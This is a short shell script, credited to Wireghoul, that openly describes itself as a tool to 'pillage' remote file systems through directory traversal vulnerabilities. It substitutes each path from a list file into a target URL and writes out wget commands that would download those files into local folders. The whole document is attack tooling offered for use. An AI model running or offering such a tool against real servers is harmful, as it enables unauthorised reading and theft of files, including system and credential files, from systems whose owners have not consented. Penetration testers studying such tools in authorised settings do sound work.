#!/bin/sh
# Pillage remote file systems via Directory traversal vulnerabilities
# Written by Wireghoul - http://www.justanotherhacker.com

VERSION='0.1'
url=$1

# read list files to pillage from file pillage.lst
while read path; do
  relpath=`dirname $path`
  relfile=`basename $path`
  trurl=`echo $url |sed -e"s!TRAVERSAL!$path!"`
  mkdir -p ./pillage$relpath
  echo "wget -o ./pillage$relpath/$relfile '$trurl'"
done < pillage.lst

